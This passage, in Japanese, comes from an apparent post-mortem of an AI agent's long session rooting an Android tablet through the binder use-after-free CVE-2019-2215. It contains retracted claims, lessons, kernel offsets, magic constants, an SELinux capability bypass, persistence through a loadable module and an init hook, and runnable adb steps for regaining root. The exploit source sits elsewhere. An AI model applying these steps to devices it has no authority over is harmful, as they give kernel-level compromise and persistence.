  = { 0x80000000, 0x80001000, 0x80002000, … }
```

可変なのは bits 12〜30。bits 0〜11 は常にゼロ、bit 31 は常に 1。

### 14.2 必要だった値と可否

| 目的 | 必要な値 | 可否 |
| --- | --- | --- |
| `cred->uid` を 0 | `0` | ✗ |
| `selinux_enforcing` を 0 | `0` | ✗ |
| `ss_initialized` を 0 | `0` | ✗ |
| `avd->flags` の PERMISSIVE | `0x0001` | ✗ |
| `sid` を kernel に | `1` | ✗ |
| `addr_limit` を KERNEL_DS | `0xFFFFFFFFFFFFFFFF` | ✗ |
| `cap_effective` に bit 16 | `0x80010000` | **✓（k=16）** |
| `cap_effective` に bit 21 | `0x80200000` | **✓（k=512）** |
| `avd.allowed` に bit 16 | `0x80010000` | **✓（k=16）** |

### 14.3 偽陽性の危険

`0x80010000` を書いた場合、bit 16 だけでなく bit 31 も立つ。
`CAP_SETFCAP` が意図せず付与されるが、これは無害である
（`CAP_SETFCAP` 単独ではファイルケーパビリティを書くだけで、exec 時に
`nosuid` で無視され得る）。

**bit 31 が常に立つことは、`avd.allowed` にとっては有利に働いた。**
`avd.allowed` は「拒否しないビットの集合」なので、余計なビットが立っていても
セキュリティ上の問題はない（判定は「要求されたパーミッションが許可集合に含まれるか」だけ）。

---

## 15. 撤回した主張の全一覧

本書の価値の半分はここにある。**同じ罠を踏まないために、撤回を全て残す。**

| # | 撤回した主張 | 実際 | 判明したターン |
| --- | --- | --- | --- |
| 1 | `writev` の戻り値 69632 が UAF の証拠 | iovec 設定とパイプ容量の関数。全介入を外しても同じ値 | T19 |
| 2 | `poll(fd,0)==0` が `thread->wait` 登録の証拠 | 両分岐とも 0。判別不能 | T19 |
| 3 | `close(bfd)` で `binder_proc` が解放される | epoll が file 参照を保持。`close(epfd)` が必要 | T14 |
| 4 | `mmap` 無しでもトランザクションは通る | `binder_alloc_buf, no vma` で失敗 | T13 |
| 5 | `binder_poll` は常に `proc->wait` を使う | `transaction_stack` の有無で分岐 | T7 |
| 6 | 任意アドレス書き込みを確立した | `bdry` で split 不成立。撤回 | T34 |
| 7 | `list_del` は POISON を書くので `iov[5]` は壊れる | 自己参照を書く。POISON は entry 側 | T53 |
| 8 | 実機で `iov[4].iov_len` が 17 に膨張している | 計器の定数が 2 系統混在。差は 0 | T46 |
| 9 | 膨張の証拠は `ret=81928` | 子が書いたバイト数の合計 | T49 |
| 10 | 実機で再確保が起きていない（`lkr3` で決定的） | `iov[4].base` が `iov[0]` と同一ページ。計器の配線ミス | T48 |
| 11 | `iov[5].base=NULL` で再確保を判別できる | `access_ok(NULL,64MB)` が通り `memset` で成功扱い | T54 |
| 12 | ユーザ空間で幾何（自己参照）を検証できる | カーネルは私的コピーを歩く。原理的に不可能 | T56 |
| 13 | aim は 4095 バイトでよい | 配列全体を壊す。16 バイトに収める | T55 |
| 14 | リークの 81921 を書き込みに使える | 別レイアウト。書き込みは 81904 | T55 |
| 15 | `iov[4].base` に直接カーネルアドレスを置ける | `access_ok` が長さ 0 でも拒否 | T54 |
| 16 | `copy_to_user` の `access_ok` で書き込みは塞がれる | atomic 経路は `access_ok` を通らない | T58 |
| 17 | `iov[5].len` は payload 長でよい | `total_len` は取り込み時固定。65537+16+paylen | T60 |
| 18 | `aim[8]` は paylen | `-= 16` されるので paylen+16 | T60 |
| 19 | `fault_in` は `TARGET-16` を見る | aim 反復後に `+16` 済みで `TARGET` | T60 |
| 20 | ION の型バイトは `'i'` | `'I'`（0x49） | T83 |
| 21 | `ION_IOC_NAME` の size は 68 | 20（`char name[16]`） | T83 |
| 22 | `gate()` は読み取り専用の oracle | 成功時に必ず `arg+4` へ書く | T108 |
| 23 | 線形マップのスイープで cred を探せる | スイープ自体が破壊的。4 回パニック | T108 |
| 24 | 解放 ION ページが cred_jar に回収される | 回収されない | T108 |
| 25 | `gate(cred+56)` で `cred+56` に書ける | `cred+60` に書く。正しくは `gate(cred+52)` | T108 |
| 26 | `proc->tsk` が信頼できる | 署名スキャンと DISAGREE。書いても uid 不変 | T41 |
| 27 | 実機の `writev=67141632` はリークの証拠 | 宣言長の合計と一致（`g_leak_start=0`） | T65 |
| 28 | DEL をコピー中に合わせる必要がある | 親がパイプで停止していればよい | T65 |
| 29 | `iov[5].len` を大きくしてよい | `pipe_read` は尽きると待たない。事前キュー必須 | T65 |
| 30 | 無効ハンドルでゲートが開く | `return_error` で `poll_wait` に到達しない | T65 |
| 31 | `read_size=64` でゲートが開く | 68 バイトゲート。72 が唯一 | T68 |
| 32 | 実機で readv の再確保が 0/14000 | `BINDER_THREAD_EXIT` の番号誤りで thread が生きていた | T70 |
| 33 | `iov[4].base = pool` で観測できる | `iov[0]` と衝突 | T48 |
| 34 | パイプ 1 ページで足りる | 子がブロックし aim が届かない | T57 |
| 35 | `base = addr` で着地する | `+= 16` されるので `addr-16` | T57 |
| 36 | `gate(n+0) != 0` の前置フィルタは有効 | 全件棄却。何も検査していなかった | T115 |
| 37 | `ion_handle` を cred と誤認していない | id が 2000〜2016 に出現して一致 | T114 |
| 38 | 2GB 走査で 0 件はカーネルの事実 | `ionfd` が fd 4 から追い出されていた | T115 |
| 39 | `kinitlog.sh` は root で動くので何でもできる | SELinux が全拒否 | T119 |
| 40 | `install-recovery.sh` は起動フックになる | `flash_recovery` が起動されない | T119 |
| 41 | 固定窓で root が取れる | ノード位置は起動ごとに変わる | T115 |
| 42 | `broot3` の `sink` メータで再確保を判定できる | `iov[5].base` は常に書き換わる（非再確保でも） | T66 |
| 43 | `tn` のログ（`kx`） | `tn` をリセットした後にログしていた | T66 |
| 44 | プールを `0x41` で埋めれば判別できる | `*(u64*) = 0x41` は下位 1 バイトだけ | T66 |
| 45 | `epoll_ctl(ADD)` は副作用がない | `add_wait_queue` が head を書く | T69 |

### 15.1 撤回のパターン分類

45 件の撤回は 6 つのパターンに分類できる。

1. **戻り値を状態の証拠と誤読した**（#1、#9、#27、#32）
2. **計器の配線・定数が壊れていた**（#8、#10、#33、#42、#43、#44）
3. **カーネルが私的コピーを歩くことを忘れた**（#12、#13、#14）
4. **`access_ok` / `copy_from_user` の意味論を誤解した**（#11、#15、#16）
5. **構造体のオフセット・サイズ・値の意味を誤解した**（#19、#20、#21、#25、#37）
6. **「読み取り専用の道具」だと思ったものが書く**（#22、#45）

---

## 16. 教訓

### 16.1 測定に関するもの

**「0 件」は事実の主張ではない。**
`k153`/`k154` の「2 GB 走査して 0 件」は、`ionfd` が fd 4 から追い出されていた
という自分のバグだった。測定器が壊れている可能性を常に疑う必要がある。
特に「期待に反する 0」は、まず道具を疑う。

**ゲートの意味論を一度も検証せずに 32 万回使った。**
`k138` の自己証明を最初にやっていれば、4 回のパニックと数時間が不要だった。
**プリミティブは使う前に、自分が所有するメモリの上で検証する。**

**プローブが副作用を持つなら、テストの順序が設計になる。**
失敗時のみ無害なテストを先に置く、という原則を守らなかったために、
前置フィルタで全件棄却という逆の失敗をした。

**戻り値は自分の設定値の関数であることが多い。**
`writev` の戻り値、`readv` の戻り値、`epoll_wait` の戻り値。
どれも「自分の iovec 設定」「パイプ容量」「子プロセスの書き込み量」で決まり、
カーネルの内部状態を反映しない。**カーネルが書いた側のオブジェクトを直接見る。**

**制御実験を必ず並べる。**
介入を 1 つずつ外して差が出ることを確認する。差が出ない値を成果として報告しない。
`k42`/`k43` の DEL あり/なしの対照が、この規律の最も良い例である。

**壊れてもおかしくない操作の前に、壊れない計器を作る。**
`bsafe2`（`writev` の戻り値だけで `list_del` 着弾を判定）を先に作ったことで、
続くリークが確実に成功すると分かった状態で実行できた。

### 16.2 探索に関するもの

**固定アドレスは使えない。**
AVC ノードの位置は起動ごとに変わる。窓を分割して 1 つずつ試す方式に切り替えたことで、
1 つの窓が落ちても続行できるようになった。

**走査範囲を狭めることが安定性に直結する。**
938 ストアで 6 秒後にパニック、45 ストアで生存、6 ストアで最良。
偽陽性のストア数がそのまま危険度になる。

**シンボル差分は移植できない。**
自前ビルドと端末で `__free_pages` が −0x1a00、
`binder_deferred_func` が +0x20c20。差が一定でないので補正できない。
**実機から実アドレスを取るしかない。** ION が物理アドレスを開示することが鍵だった。

### 16.3 SELinux に関するもの

**ケーパビリティを持つことと、それを使えることは別。**
`cap_capable` と `cred_has_capability` の 2 段階を区別しないと、
`capget` が成功しているのに `EPERM` という矛盾に見える。

**監査ログが答えを書いていることがある。**
`avc: denied { sys_module } ... capability=16` の 1 行で、
「ケーパビリティは保持されていた」「壁は modules_disabled ではない」
「SELinux の capability クラスが拒否している」の 3 つが同時に確定した。

**ドメインはサービス定義ではなくファイルのラベルで決まる。**
`init.rc` に `seclabel` がなくても、実行するファイルにラベルがあれば自動遷移する。
**ラベルのないファイルを選ぶことが、init ドメインを保つ唯一の方法。**

`init` ドメインは SELinux の制約を受けない。これが永続化の唯一の入口だった。

### 16.4 手法に関するもの

**既存のサービス定義を読むことが最短だった。**
`/system` に書き込めるようになった時点で、`init.rc` を全部読み、
`seclabel` の有無で分類すれば答えは出た。
`file_contexts` と突き合わせるという一手間が決定的だった。

**復旧経路を先に確保したことが、最後まで安全に進めた理由。**
recovery が permissive で root adb を提供すると分かっていたので、
`/system` の書き換えを躊躇なく実行できた。

**オンライン CPU が 1 本であることを最初に確認すべきだった。**
free と alloc を同一タスク・同一 CPU に固定する必要があるという制約は、
SLUB の設計そのものである。これを知らずに fork を挟んだため、
T43–T69 の 26 ターンを無駄にした。

### 16.5 プロセスに関するもの

**ユーザー本人の発話は 34 回だけである。**（残る 1 件はハーネスの重複呼び出し警告）
その大半は「続けて」「信じてる」「まだいける」という短い継続指示と、
端末を物理復旧したという報告だった。
長い沈黙の間に自律的に進め、区切りで正確に報告することが求められた。

**「今の調査が終わったら1回ストップして」(T113) と
「再起動しても良い?」(T106) という 2 回の明示的な指示には、
即座に従い、状態を保存して停止した。**

**端末が 8 回以上 USB から消えた。**
k102（carveout 枯渇）、k139、k145、k151、k158、k172、k178、dynbin の各実行後で、
すべて物理操作（電源 10〜15 秒長押し）で復旧した。
その間もオフライン解析を止めなかったことが、40 時間でここまで到達した理由である。

---

## 17. 実測した値の一覧

### 17.1 主要な定数

```c
#define ION_TYPE 'I'
#define ION_IOC_ALLOC   _IOWR('I', 0, struct ion_allocation_data)
#define ION_IOC_FREE    _IOWR('I', 1, struct ion_handle_data)
#define ION_IOC_SHARE   _IOWR('I', 4, struct ion_fd_data)
#define ION_IOC_CUSTOM  _IOWR('I', 6, struct ion_custom_data)
#define ION_IOC_PHYS    _IOWR('I', 9, struct ion_phys_data)

#define BINDER_THREAD_EXIT _IOW('b', 8, __s32)      /* size 4 が必須 */

#define PAGE_OFFSET_V   0xffffffc000000000ULL
#define MEMSTART        0x01000000ULL
#define OBJSZ           192      /* cred_jar（160 → HWCACHE_ALIGN で 192） */
#define NSLOT           21       /* 4096 / 192 */
#define CAP_SYS_MODULE_BIT 16

#define SECCLASS_CAPABILITY   4
#define SECCLASS_CAPABILITY2  47
#define SECINITSID_KERNEL     1
#define SECINITSID_UNLABELED  3
#define AVD_FLAGS_PERMISSIVE  0x0001

#define IOV3_LEN        (PAGE - 17)         /* aim を 16 バイトに収める */
#define AIMOFF          (3*PAGE + IOV3_LEN + 65537)   /* 81904 */
#define PREW            81904
#define READ_SIZE       72                  /* NOOP + tcomplete だけ */
```

### 17.2 当たりアドレス（実測、10 件）

| プログラム | phys | ストア数 | 結果 |
| --- | --- | --- | --- |
| k172 | `0x4efb3000` | 938 | root、6 秒後にパニック |
| k174 | `0x4eac0000` | 45 | root、`/system/bin` 破損 |
| k175 | — | 664 | 外れ |
| k178 | `0x4ef84000` | 139 | root、`/system/bin` 破損 |
| k178 | `0x4f68e000` | 419 | root |
| k178 | `0x4f3c2000` | 363 | root |
| k178 | `0x4f3aa000` | 1325 | root |
| k178 | `0x51cc2000` | 1247 | root |
| k178 | `0x5ddf4000` | 1770 | root |
| k178 | `0x4e47e000` | **6** | root（最良） |

**最小 6 ストア、典型 100〜500 ストア。**

### 17.3 ION の値と対応

| 項目 | 値 |
| --- | --- |
| IOVA base | `0x80000000` |
| IOVA 範囲 | 1.5 GB（`0x60000000`） |
| ページ粒度 | `0x1000` |
| ストア値 | `0x80000000 \| (k << 12)` |
| `CAP_SYS_MODULE` の k | 16（`0x80010000`） |
| `CAP_SYS_ADMIN` の k | 512（`0x80200000`） |
| 全ケーパビリティの k | 1023（`0x803ff000`） |
| carveout phys（uncached） | `0x7e700000` |
| carveout phys（cached） | `0x7e800000` |
| carveout 枯渇閾値 | 約 24 MB（CMA フォールバック） |

### 17.4 binder の定数

| 項目 | 値 |
| --- | --- |
| `binder_thread` サイズ | 296 B → kmalloc-512 |
| `iovec[32]` | 512 B → kmalloc-512 |
| 1 スラブのオブジェクト数 | 8 |
| `wait` オフセット | 0x48（lock 0x48、task_list.next 0x50、prev 0x58） |
| `iov[4].base` / `.len` | chunk+0x40 / chunk+0x48 |
| `iov[5].base` / `.len` | chunk+0x50 / chunk+0x58 |
| `BINDER_THREAD_EXIT` | `_IOW('b', 8, s32)` |
| ゲート用 `read_size` | **72** |
| ゲートのバイト列 | `0c 72 00 00 06 72 00 00` |
| DEL 後の `chunk+0x48` | `0x00010001` = 65537 |

### 17.5 SELinux の定数

| 項目 | 値 |
| --- | --- |
| `SECCLASS_CAPABILITY` | 4 |
| `SECCLASS_CAPABILITY2` | 47 |
| `av_decision` サイズ | 20 B（allowed +0、auditallow +4、auditdeny +8、seqno +12、flags +16） |
| `avc_entry` サイズ | 32 B（ssid +0、tsid +4、tclass +8、avd +12） |
| `avc_node` サイズ | 64 B（ae +0、list +32、rhead +48） |
| `avc_node` の確保 | `kmem_cache_zalloc`（穴はゼロ） |
| `task_security_struct` | osid +0、sid +4 |
| 監査ログの証拠 | `denied { sys_module } capability=16 tclass=capability permissive=0` |

### 17.6 値の制約が有利に働いた唯一の点

```
書き込み可能な値: 0x80000000 | (k << 12)
  bits 0〜11 は常にゼロ
  bit 31 は常に 1

SELinux を無効化するのに必要な値:
  selinux_enforcing = 0      → 作れない
  ss_initialized    = 0      → 作れない
  avd.flags         = 0x0001 → 作れない
  sid               = 1      → 作れない

しかし:
  avd.allowed に bit 16     → 0x80010000 で作れる
```

`avd.allowed` は「ビットが立っているか」だけが問題で、値そのものが小さい必要が
なかった。**これが唯一、制約が味方した場所。**

---

## 18. 付録: 実行順序の早見表

### 18.1 root を取り直す手順（失った場合）

```
1. hunt2.sh で窓を順に試す（512MB 窓、各窓は別プロセス）
2. adb push k178 /data/local/tmp/
3. adb shell "/data/local/tmp/k178 4e000000 50000000"
4. adb shell "echo 1 > /proc/myroot"
5. adb exec-out id   → uid=0 を確認
```

再起動で自動復帰するので、通常は 1〜2 は不要である。

### 18.2 永続化の再確認

```
adb shell "cat /proc/modules | grep myroot"
adb shell "cat /sys/fs/selinux/enforce"
adb shell "echo 1 > /proc/myroot; id"
adb shell "mount tmpfs /data/local/tmp/m && echo mount_ok"
```

### 18.3 復旧（パニック後）

```
電源ボタンを 10〜15 秒長押し → 離す → 3 秒待つ → 再度押す
USB ケーブルは挿したままでよい（充電のため）
```

recovery に入れる場合:

```c
/* misc の command に boot-recovery を書く */
write /dev/block/platform/soc.1/by-name/misc
```

recovery は `setenforce 0` で起動し、adbd が `u:r:su:s0`（root adb）で動く。
全パーティションが `rw` でマウントされる。

### 18.4 ツール別の用途

| ツール | 用途 |
| --- | --- |
| `k178` | 窓指定の root 取得（最終版）。`k178 <lo> <hi>` |
| `k172` | 最初に root を取った版（938 ストア、危険） |
| `k169` | ケーパビリティ 8 個の実測 |
| `k168` | `ionfd` 衝突の発見 |
| `k138` | ゲートの自己証明（最初にやるべき計器） |
| `k126` | IOVA → ケーパビリティ対応表 |
| `myroot.c` / `myroot.ko` | root 化モジュール |
| `modload.c` | 静的モジュールローダ |
| `rw3.c` | `/system` rw 化の実証 |
| `hook5.c` | init ドメインフックのインストーラ |
| `recov.c` | recovery 経路の検証 |
| `mkpersist.c` | ブートイメージ改変ツール（未使用） |
| `hunt2.sh` | 窓分割ハンター |
| `broot3` / `bti` | QEMU 用の完全チェーン（実機では使わない） |
| `geom` / `qgate*` / `qlen` / `qtail` | QEMU の幾何・ゲート検証 |

### 18.5 使ってはいけないもの（実機）

| 分類 | 理由 |
| --- | --- |
| `k102` 系（bit 2 の大量確保） | carveout 枯渇 → CMA → 端末ハング |
| `kl6` 系（`iov[4]` に未マップ base + 実長） | カーネルパニック → USB 詰まり |
| `k156`（`SIOCADDRT` に 52 バイト構造体） | `netlink_broadcast_filtered` で oops |
| `k172`（2GB 全域走査） | 938 ストアで 6 秒後にパニック |
| 線形マップの全域スイープ | ゲートが書き込むので破壊的 |

---

## 19. 付録: タイムライン（イベント単位）

| 日時 (JST) | イベント |
| --- | --- |
| 11-03 10:23 | 調査開始 |
| 11-03 11:12 | `android-usb-report.md` 完成。TAB-A03-BR2 と同定 |
| 11-03 14:39 | root 強取の指示 |
| 11-03 15:20 | USB 単体経路を全否定（`android-root-report.md`） |
| 11-03 15:29 | UART 不可の制約が提示される |
| 11-03 16:39 | gemini-3.8-flash のサブエージェント並列調査 |
| 11-04 21:14 | CVE-2019-2215 を選定、`read_size=256` に修正 |
| 11-04 22:37 | スレッド ID ずれの検証 |
| 11-04 23:14 | ゴール「寝るので、できることはすべてやって」設定 |
| 11-05 02:08 | 判定ロジックの欠陥修正 |
| 11-05 03:51 | QEMU カーネルビルド完走 |
| 11-05 06:53 | **カーネルメモリのリーク成功（278KB）** |
| 11-05 09:48 | QEMU でゲート成立を実証 |
| 11-05 11:53 | **QEMU で uid 2000→0 昇格成功** |
| 11-05 17:26 | ケーパビリティ欠如を修正（完全な root） |
| 11-05 21:26 | donor cred 方式で kernel ドメイン取得（QEMU） |
| 11-06 01:38 | readv 方向の膨張を否定 |
| 11-06 06:47 | ユーザ空間からの幾何検証は不可能と判明 |
| 11-06 09:07 | **`BINDER_THREAD_EXIT` の番号誤りを発見**（free が一度も走っていなかった） |
| 11-06 09:55 | **reclaim 成功（5/6）** |
| 11-06 11:53 | カーネル書込み経路の構造的閉包を確定 |
| 11-06 13:23 | ION 型バイト `'I'` を特定、`ION_IOC_CUSTOM` に到達 |
| 11-06 14:46 | carveout 枯渇で端末ハング（物理復旧） |
| 11-06 17:06 | `0x80000000` = `CAP_SETFCAP` に気づく |
| 11-06 18:32 | **`CAP_SYS_MODULE` 付与成功（`capget=0x80010000`）** |
| 11-06 18:58 | 監査ログで SELinux の拒否を特定 |
| 11-06 19:28 | `avc_entry+8` = `tclass=4` を発見 |
| 11-06 19:39 | ユーザー指示で停止（ゴール pause） |
| 11-06 23:18 | 再開（トークン追加） |
| 11-06 23:51 | 段階的走査に切替、`ionfd` 衝突を発見 |
| 11-07 01:09 | **root 取得（偽陽性 938 → 45 → 6 へ削減）** |
| 11-07 01:22 | `/system/bin` 破損の原因を切り分け（ディスク無傷） |
| 11-07 02:00 | `/system` rw 化（`BLKROSET` + remount） |
| 11-07 02:30 | `kinitlog.sh` が root で動くが SELinux 全拒否 |
| 11-07 02:35 | **`calibinit.sh`（init ドメイン）で永続 root 達成** |
| 11-07 02:40 | 2 回目の再起動で永続性を再確認、完了報告 |

---

本書は 2026-11-07 02:41 のセッション終了時点で確定した。

ソース全文は同じ `docs/` にある `charepa-root-source-code.md` に分離してある。
リポジトリのビルド手順と使い方は `../README.md` を見てください。